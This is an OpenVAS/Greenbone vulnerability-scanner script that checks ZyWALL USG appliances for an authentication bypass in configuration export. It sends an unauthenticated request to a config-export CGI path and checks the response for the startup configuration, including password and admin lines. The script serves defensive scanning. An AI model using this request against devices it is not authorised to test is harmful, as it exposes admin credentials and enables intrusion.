if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103161" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-05-12 13:24:44 +0200 (Thu, 12 May 2011)" );
	script_bugtraq_id( 47707 );
	script_tag( name: "cvss_base", value: "2.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:N/I:P/A:N" );
	script_name( "Multiple ZyWALL USG Products Remote Security Bypass Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/47707" );
	script_xref( name: "URL", value: "http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-003/-authentication-bypass-in-configuration-import-and-export-of-zyxel-zywall-usg-appliances" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 443 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Reportedly, the issue is fixed. However, Symantec has not confirmed
  this. Please contact the vendor for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Multiple ZyWALL USG products are prone to a security-bypass
  vulnerability.

  Note: Reportedly, the firmware is also prone to a weakness that allows
  password-protected upgrade files to be decrypted with a known plaintext attack." );
	script_tag( name: "impact", value: "Successful exploits may allow attackers to bypass certain security
  restrictions and perform unauthorized actions." );
	script_tag( name: "affected", value: "ZyWALL USG-20 ZyWALL USG-20W ZyWALL USG-50 ZyWALL USG-100 ZyWALL USG-
  200 ZyWALL USG-300 ZyWALL USG-1000 ZyWALL USG-1050 ZyWALL USG-2000" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 443 );
url = NASLString( "/" );
if(http_vuln_check( port: port, url: url, pattern: "<title>ZyWALL USG", usecache: TRUE )){
	url = NASLString( "/cgi-bin/export-cgi/images/?category=config&arg0=startup-config.conf" );
	if(http_vuln_check( port: port, url: url, pattern: "model: ZyWALL USG", extra_check: make_list( "password",
		 "interface",
		 "user-type admin" ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

